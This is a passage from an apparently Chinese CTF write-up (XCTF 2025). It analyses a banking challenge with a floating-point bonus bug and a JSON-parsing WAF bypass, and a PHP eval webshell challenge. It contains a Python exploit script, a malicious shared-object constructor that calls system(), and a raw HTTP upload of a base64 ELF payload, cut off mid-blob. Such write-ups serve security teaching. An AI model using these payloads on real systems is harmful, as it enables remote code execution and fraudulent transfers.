&#125;</span><br><span class="line">    <span class="keyword">const</span> rawBody = <span class="title class_">Buffer</span>.<span class="title function_">concat</span>(chunks);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (rawBody[<span class="number">0</span>] === <span class="number">0xEF</span> &amp;&amp; rawBody[<span class="number">1</span>] === <span class="number">0xBB</span> &amp;&amp; rawBody[<span class="number">2</span>] === <span class="number">0xBF</span>) &#123;</span><br><span class="line">      <span class="title function_">logTraffic</span>(req, &#123; <span class="attr">blocked</span>: <span class="literal">true</span>, <span class="attr">reason</span>: <span class="string">&quot;Invalid encoding detected&quot;</span>, <span class="attr">bodyLength</span>: rawBody.<span class="property">length</span> &#125;);</span><br><span class="line">      reply.<span class="title function_">code</span>(<span class="number">400</span>).<span class="title function_">send</span>(&#123;</span><br><span class="line">        <span class="attr">error</span>: <span class="string">&quot;Bad Request&quot;</span>,</span><br><span class="line">        <span class="attr">message</span>: <span class="string">&quot;Invalid character encoding&quot;</span></span><br><span class="line">      &#125;);</span><br><span class="line">      <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">      <span class="keyword">const</span> body = <span class="title class_">JSON</span>.<span class="title function_">parse</span>(rawBody.<span class="title function_">toString</span>());</span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> (body.<span class="property">from</span> &amp;&amp; body.<span class="property">from</span>.<span class="title function_">toLowerCase</span>() === <span class="string">&quot;admin&quot;</span>) &#123;</span><br><span class="line">        <span class="title function_">logTraffic</span>(req, &#123; <span class="attr">blocked</span>: <span class="literal">true</span>, <span class="attr">reason</span>: <span class="string">&quot;Transfer from admin account is forbidden&quot;</span> &#125;);</span><br><span class="line">        reply.<span class="title function_">code</span>(<span class="number">403</span>).<span class="title function_">send</span>(&#123;</span><br><span class="line">          <span class="attr">error</span>: <span class="string">&quot;Forbidden&quot;</span>,</span><br><span class="line">          <span class="attr">message</span>: <span class="string">&quot;Transfer from admin account is not allowed&quot;</span></span><br><span class="line">        &#125;);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> (body.<span class="property">amount</span> &amp;&amp; body.<span class="property">amount</span> &gt; <span class="number">50000</span>) &#123;</span><br><span class="line">        <span class="title function_">logTraffic</span>(req, &#123; <span class="attr">blocked</span>: <span class="literal">true</span>, <span class="attr">reason</span>: <span class="string">&quot;Large transfer detected&quot;</span> &#125;);</span><br><span class="line">        reply.<span class="title function_">code</span>(<span class="number">403</span>).<span class="title function_">send</span>(&#123;</span><br><span class="line">          <span class="attr">error</span>: <span class="string">&quot;Forbidden&quot;</span>,</span><br><span class="line">          <span class="attr">message</span>: <span class="string">&quot;Large transfers are not allowed for security reasons&quot;</span></span><br><span class="line">        &#125;);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">      <span class="title function_">logTraffic</span>(req, &#123; <span class="attr">blocked</span>: <span class="literal">false</span>, <span class="attr">validated</span>: <span class="literal">true</span> &#125;);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (e) &#123;</span><br><span class="line">      <span class="title function_">logTraffic</span>(req, &#123; <span class="attr">parseError</span>: <span class="literal">true</span>, <span class="attr">message</span>: e.<span class="property">message</span>, <span class="attr">bodyLength</span>: rawBody.<span class="property">length</span> &#125;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">const</span> &#123; <span class="title class_">Readable</span> &#125; = <span class="built_in">require</span>(<span class="string">&#x27;stream&#x27;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="title class_">Readable</span>.<span class="title function_">from</span>([rawBody]);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>



<p><img src="/2025/12/08/XCTF2025/98c03e6a-0e2e-44d2-93c9-a4331b23b998.png"></p>
<h3 id="Backend-业务逻辑层"><a href="#Backend-业务逻辑层" class="headerlink" title="Backend (业务逻辑层)"></a>Backend (业务逻辑层)</h3><p>API 端点</p>
<ol>
<li><p>POST &#x2F;register: 注册用户（初始余额为 0）</p>
</li>
<li><p>POST &#x2F;balance: 查询余额</p>
</li>
<li><p>POST &#x2F;transfer: 转账（核心漏洞点）</p>
</li>
<li><p>GET &#x2F;flag: 获取 flag（需要余额 ≥ 100,000.01）</p>
</li>
<li><p>GET &#x2F;users: 查看所有用户</p>
</li>
<li><p>GET &#x2F;: 前端页面</p>
</li>
</ol>
<p>转账逻辑</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line">app.<span class="title function_">post</span>(<span class="string">&quot;/transfer&quot;</span>, <span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line">  <span class="keyword">const</span> &#123; <span class="keyword">from</span>, to, amount &#125; = req.<span class="property">body</span>;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (!<span class="keyword">from</span> || !to || <span class="keyword">typeof</span> <span class="keyword">from</span> !== <span class="string">&quot;string&quot;</span> || <span class="keyword">typeof</span> to !== <span class="string">&quot;string&quot;</span>) &#123;</span><br><span class="line">    <span class="keyword">return</span> res.<span class="title function_">status</span>(<span class="number">400</span>).<span class="title function_">json</span>(&#123; <span class="attr">error</span>: <span class="string">&quot;Invalid from or to username&quot;</span> &#125;);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (<span class="keyword">typeof</span> amount !== <span class="string">&quot;number&quot;</span> || amount &lt;= <span class="number">0</span>) &#123;</span><br><span class="line">    <span class="keyword">return</span> res.<span class="title function_">status</span>(<span class="number">400</span>).<span class="title function_">json</span>(&#123; <span class="attr">error</span>: <span class="string">&quot;Invalid amount&quot;</span> &#125;);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">const</span> fromUser = users.<span class="title function_">get</span>(<span class="keyword">from</span>);</span><br><span class="line">  <span class="keyword">const</span> toUser = users.<span class="title function_">get</span>(to);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (!fromUser) &#123;</span><br><span class="line">    <span class="keyword">return</span> res.<span class="title function_">status</span>(<span class="number">404</span>).<span class="title function_">json</span>(&#123; <span class="attr">error</span>: <span class="string">&quot;From user not found&quot;</span> &#125;);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (!toUser) &#123;</span><br><span class="line">    <span class="keyword">return</span> res.<span class="title function_">status</span>(<span class="number">404</span>).<span class="title function_">json</span>(&#123; <span class="attr">error</span>: <span class="string">&quot;To user not found&quot;</span> &#125;);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (fromUser.<span class="property">balance</span> &lt; amount) &#123;</span><br><span class="line">    <span class="keyword">return</span> res.<span class="title function_">status</span>(<span class="number">400</span>).<span class="title function_">json</span>(&#123; <span class="attr">error</span>: <span class="string">&quot;Insufficient balance&quot;</span> &#125;);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  fromUser.<span class="property">balance</span> = fromUser.<span class="property">balance</span> - amount;</span><br><span class="line">  toUser.<span class="property">balance</span> = toUser.<span class="property">balance</span> + amount;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">let</span> score = amount;</span><br><span class="line">  score = <span class="title class_">Math</span>.<span class="title function_">sqrt</span>(score);</span><br><span class="line">  score = <span class="title class_">Math</span>.<span class="title function_">sqrt</span>(score);</span><br><span class="line">  score = score * score;</span><br><span class="line">  score = score * score;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">const</span> precision_error = score - amount;</span><br><span class="line">  <span class="keyword">const</span> bonus = <span class="title class_">Math</span>.<span class="title function_">abs</span>(precision_error) * <span class="number">10000000</span>;</span><br><span class="line"></span><br><span class="line">  fromUser.<span class="property">balance</span> = fromUser.<span class="property">balance</span> + bonus;</span><br><span class="line"></span><br><span class="line">  res.<span class="title function_">json</span>(&#123;</span><br><span class="line">    <span class="attr">message</span>: <span class="string">&quot;Transfer successful&quot;</span>,</span><br><span class="line">    <span class="keyword">from</span>,</span><br><span class="line">    to,</span><br><span class="line">    amount,</span><br><span class="line">    <span class="attr">bonus</span>: bonus,</span><br><span class="line">    <span class="attr">newBalance</span>: fromUser.<span class="property">balance</span></span><br><span class="line">  &#125;);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>

<p>Bonus 计算（浮点数精度漏洞）:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">score = amount</span><br><span class="line">score = √√score    // 开两次平方根</span><br><span class="line">score = score²²    // 平方两次</span><br><span class="line">precision_error = score - amount</span><br><span class="line">bonus = |precision_error| × 10,000,000</span><br></pre></td></tr></table></figure>

<ul>
<li><p>JavaScript 使用 IEEE 754 双精度浮点数</p>
</li>
<li><p>连续的平方根和平方运算会引入精度误差</p>
</li>
<li><p>误差 × 10,000,000 放大后产生可观的 bonus</p>
</li>
</ul>
<h3 id="x20-WAF-绕过（BOM-JSON-解析差异）"><a href="#x20-WAF-绕过（BOM-JSON-解析差异）" class="headerlink" title="&#x20;WAF 绕过（BOM + JSON 解析差异）"></a>&#x20;WAF 绕过（BOM + JSON 解析差异）</h3><p>关键问题: Gateway 和 Backend 对 JSON 的处理不一致</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 1. 检查 BOM，如果发现则直接拒绝</span></span><br><span class="line"><span class="keyword">if</span> (rawBody[<span class="number">0</span>] === <span class="number">0xEF</span> &amp;&amp; rawBody[<span class="number">1</span>] === <span class="number">0xBB</span> &amp;&amp; rawBody[<span class="number">2</span>] === <span class="number">0xBF</span>) &#123;</span><br><span class="line">  <span class="keyword">return</span> reply.<span class="title function_">code</span>(<span class="number">400</span>).<span class="title function_">send</span>(&#123;...&#125;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 2. 解析 JSON 检查 from 字段</span></span><br><span class="line"><span class="keyword">const</span> body = <span class="title class_">JSON</span>.<span class="title function_">parse</span>(rawBody.<span class="title function_">toString</span>());</span><br><span class="line"><span class="keyword">if</span> (body.<span class="property">from</span> &amp;&amp; body.<span class="property">from</span>.<span class="title function_">toLowerCase</span>() === <span class="string">&quot;admin&quot;</span>) &#123;</span><br><span class="line">  <span class="keyword">return</span> reply.<span class="title function_">code</span>(<span class="number">403</span>).<span class="title function_">send</span>(&#123;...&#125;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ul>
<li><p>如果能构造特殊编码的 JSON，让 Gateway 解析失败（进入 catch 分支）但不触发 BOM 检测</p>
</li>
<li><p>这样请求会被转发到 Backend，而 Backend 可能正确解析出 “from”: “admin”</p>
</li>
</ul>
<ol>
<li><p>注册用户 bob</p>
</li>
<li><p>构造特殊编码的 payload 绕过 Gateway 的 from: “admin” 检测</p>
</li>
<li><p>让 Backend 解析为 {“from”: “admin”, “to”: “bob”, “amount”: 50000}</p>
</li>
<li><p>从 admin 账户转走 100,000</p>
</li>
<li><p>获取 flag</p>
</li>
</ol>
<h3 id="漏洞利用-解题步骤"><a href="#漏洞利用-解题步骤" class="headerlink" title="漏洞利用&#x2F;解题步骤"></a>漏洞利用&#x2F;解题步骤</h3><p>伪代码：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"></span><br><span class="line">BASE_URL = <span class="string">&quot;http://localhost:3000&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 注册用户</span></span><br><span class="line">username = <span class="string">&quot;hacker&quot;</span></span><br><span class="line">requests.post(<span class="string">f&quot;<span class="subst">&#123;BASE_URL&#125;</span>/register&quot;</span>, json=&#123;<span class="string">&quot;username&quot;</span>: username&#125;)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 方法1: 浮点数攻击</span></span><br><span class="line"><span class="comment"># 找到最优的金额值，例如 0.01</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">100000</span>):</span><br><span class="line">    requests.post(<span class="string">f&quot;<span class="subst">&#123;BASE_URL&#125;</span>/transfer&quot;</span>, json=&#123;</span><br><span class="line">        <span class="string">&quot;from&quot;</span>: username,</span><br><span class="line">        <span class="string">&quot;to&quot;</span>: username,</span><br><span class="line">        <span class="string">&quot;amount&quot;</span>: <span class="number">0.01</span></span><br><span class="line">    &#125;)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 方法2: WAF绕过（需要构造特殊payload）</span></span><br><span class="line"><span class="comment"># 构造让Gateway解析失败但Backend能解析的JSON</span></span><br><span class="line">special_payload = <span class="string">b&#x27;&lt;special_encoding&gt;&#123;&quot;from&quot;:&quot;admin&quot;,&quot;to&quot;:&quot;hacker&quot;,&quot;amount&quot;:50000&#125;&#x27;</span></span><br><span class="line">requests.post(<span class="string">f&quot;<span class="subst">&#123;BASE_URL&#125;</span>/transfer&quot;</span>, data=special_payload, </span><br><span class="line">              headers=&#123;<span class="string">&quot;Content-Type&quot;</span>: <span class="string">&quot;application/json&quot;</span>&#125;)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 获取flag</span></span><br><span class="line">flag = requests.get(<span class="string">f&quot;<span class="subst">&#123;BASE_URL&#125;</span>/flag?username=<span class="subst">&#123;username&#125;</span>&quot;</span>).json()</span><br><span class="line"><span class="built_in">print</span>(flag)</span><br></pre></td></tr></table></figure>

<hr>
<h2 id="kidding-XXX-SOLVED"><a href="#kidding-XXX-SOLVED" class="headerlink" title="kidding || XXX || SOLVED"></a>kidding || XXX || SOLVED</h2><p><a href="files/Dockerfile">Dockerfile</a></p>
<p><a href="files/PHP%208.4.14%20-%20phpinfo().html">PHP 8.4.14 - phpinfo().html</a></p>
<p>so ez baby-level php chall?&#x20;</p>
<p>题目</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line">@eval($_POST[&quot;cmd&quot;]);</span><br></pre></td></tr></table></figure>

<p>题目分析</p>
<p>reference：</p>
<p><a target="_blank" rel="noopener" href="https://hackerone.com/reports/3293801">https://hackerone.com/reports/3293801</a></p>
<p><a target="_blank" rel="noopener" href="https://github.com/php/php-src/commit/1b803bc3f57ca58f82f3be6127c8c6d72bc93447">https://github.com/php/php-src/commit/1b803bc3f57ca58f82f3be6127c8c6d72bc93447</a></p>
<p>生成恶意的so文件</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">// This constructor function is executed automatically by the dynamic loader</span></span><br><span class="line"><span class="comment">// as soon as the library is loaded into the process address space.</span></span><br><span class="line">__attribute__((constructor))</span><br><span class="line"><span class="function"><span class="type">static</span> <span class="type">void</span> <span class="title">rce_init</span><span class="params">(<span class="type">void</span>)</span> </span>&#123;</span><br><span class="line">    <span class="built_in">system</span>(<span class="string">&quot;id &gt; /tmp/RCE_VIA_ENGINE&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcc -fPIC -shared -o evil_engine.so evil_engine.c</span><br></pre></td></tr></table></figure>



<p>上传so文件</p>
<figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">POST</span> <span class="string">/</span> <span class="string">HTTP/1.1</span></span><br><span class="line"><span class="attr">Host:</span> <span class="number">192.168</span><span class="number">.149</span><span class="number">.128</span><span class="string">:8080</span></span><br><span class="line"><span class="attr">Content-Length:</span> <span class="number">20677</span></span><br><span class="line"><span class="attr">Cache-Control:</span> <span class="string">max-age=0</span></span><br><span class="line"><span class="attr">Accept-Language:</span> <span class="string">zh-CN</span></span><br><span class="line"><span class="attr">Upgrade-Insecure-Requests:</span> <span class="number">1</span></span><br><span class="line"><span class="attr">Origin:</span> <span class="string">http://192.168.149.128:8080</span></span><br><span class="line"><span class="attr">Content-Type:</span> <span class="string">application/x-www-form-urlencoded</span></span><br><span class="line"><span class="attr">User-Agent:</span> <span class="string">Mozilla/5.0</span> <span class="string">(Windows</span> <span class="string">NT</span> <span class="number">10.0</span><span class="string">;</span> <span class="string">Win64;</span> <span class="string">x64)</span> <span class="string">AppleWebKit/537.36</span> <span class="string">(KHTML,</span> <span class="string">like</span> <span class="string">Gecko)</span> <span class="string">Chrome/127.0.6533.100</span> <span class="string">Safari/537.36</span></span><br><span class="line"><span class="attr">Accept:</span> <span class="string">text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7</span></span><br><span class="line"><span class="attr">Referer:</span> <span class="string">http://192.168.149.128:8080/</span></span><br><span class="line"><span class="attr">Accept-Encoding:</span> <span class="string">gzip,</span> <span class="string">deflate,</span> <span class="string">br</span></span><br><span class="line"><span class="attr">Connection:</span> <span class="string">keep-alive</span></span><br><span class="line"></span><br><span class="line"><span class="string">cmd=eval(file_put_contents(&#x27;evil_engine.so&#x27;,base64_decode(&#x27;f0VMRgIBAQAAAAAAAAAAAAMAPgABAAAAAAAAAAAAAABAAAAAAAAAABA1AAAAAAAAAAAAAEAAOAAJAEAAHAAbAAEAAAAEAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAiAQAAAAAAACIBAAAAAAAAAAQAAAAAAAAAQAAAAUAAAAAEAAAAAAAAAAQAAAAAAAAABAAAAAAAAApAQAAAAAAACkBAAAAAAAAABAAAAAAAAABAAAABAAAAAAgAAAAAAAAACAAAAAAAAAAIAAAAAAAALQAAAAAAAAAtAAAAAAAAAAAEAAAAAAAAAEAAAAGAAAA8C0AAAAAAADwPQAAAAAAAPA9AAAAAAAAIAIAAAAAAAAoAgAAAAAAAAAQAAAAAAAAAgAAAAYAAAAILgAAAAAAAAg+AAAAAAAACD4AAAAAAADAAQAAAAAAAMABAAAAAAAACAAAAAAAAAAEAAAABAAAADgCAAAAAAAAOAIAAAAAAAA4AgAAAAAAACQAAAAAAAAAJAAAAAAAAAAEAAAAAAAAAFDldGQEAAAAECAAAAAAAAAQIAAAAAAAABAgAAAAAAAAJAAAAAAAAAAkAAAAAAAAAAQAAAAAAAAAUeV0ZAYAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAEAAAAAAAAABS5XRkBAAAAPAtAAAAAAAA8D0AAAAAAADwPQAAAAAAABACAAAAAAAAEAIAAAAAAAABAAAAAAAAAAQAAAAUAAAAAwAAAEdOVQD88woq1OulYZdEihGwrNzjfDsC5QAAAAABAAAAAQAAAAEAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABAAAAAgAAAAAAAAAAAAAAAAAAAAAAAAAFUAAAASAAAAAAAAAAAAAAAAAAAAAAAAAAEAAAAgAAAAAAAAAAAAAAAAAAAAAAAAACwAAAAgAAAAAAAAAAAAAAAAAAAAAAAAAEYAAAAiAAAAAAAAAAAAAAAAAAAAAAAAAABfX2dtb25fc3RhcnRfXwBfSVRNX2RlcmVnaXN0ZXJUTUNsb25lVGFibGUAX0lUTV9yZWdpc3RlclRNQ2xvbmVUYWJsZQBfX2N4YV9maW5hbGl6ZQBzeXN0ZW0AbGliYy5zby42AEdMSUJDXzIuMi41AAAAAQACAAEAAQACAAAAAQABAFwAAAAQAAAAAAAAAHUaaQkAAAIAZgAAAAAAAADwPQAAAAAAAAgAAAAAAAAAABEAAAAAAAD4PQAAAAAAAAgAAAAAAAAACREAAAAAAAAAPgAAAAAAAAgAAAAAAAAAwBAAAAAAAAAIQAAAAAAAAAgAAAAAAAAACEAAAAAAAADIPwAAAAAAAAYAAAABAAAAAAAAAAAAAADQPwAAAAAAAAYAAAADAAAAAAAAAAAAAADYPwAAAAAAAAYAAAAEAAAAAAAAAAAAAADgPwAAAAAAAAYAAAAFAAAAAAAAAAAAAAAAQAAAAAAAAAcAAAACAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA